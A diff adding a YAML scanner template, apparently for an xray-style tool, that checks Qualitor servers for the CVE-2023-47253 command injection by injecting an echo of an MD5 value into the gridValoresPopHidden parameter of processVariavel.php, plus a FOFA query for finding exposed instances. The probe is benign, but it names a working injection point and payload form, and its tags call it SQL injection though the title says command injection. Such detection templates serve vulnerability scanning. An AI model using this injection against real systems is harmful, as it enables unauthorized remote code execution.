@@ -1,0 +1,18 @@
+id: poc-yaml-qualitor-processvar-rce
+info:
+  name: Qualitor Qalitor命令注入漏洞(CVE-2023-47253)
+  severity: critical
+  tags:
+  - sql-injection
+  - CVE-2023-47253
+  finger: qalitor
+  fofa: app="Qualitor-Web"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /html/ad/adpesquisasql/request/processVariavel.php?gridValoresPopHidden=echo%20md5({{.t1}});
+  expression: "status_code == 200 && \nsubstr(body, 0, 32) == t2 &&\ncontains(body,\"\
+    closeWindow\")\n"
+transport: http
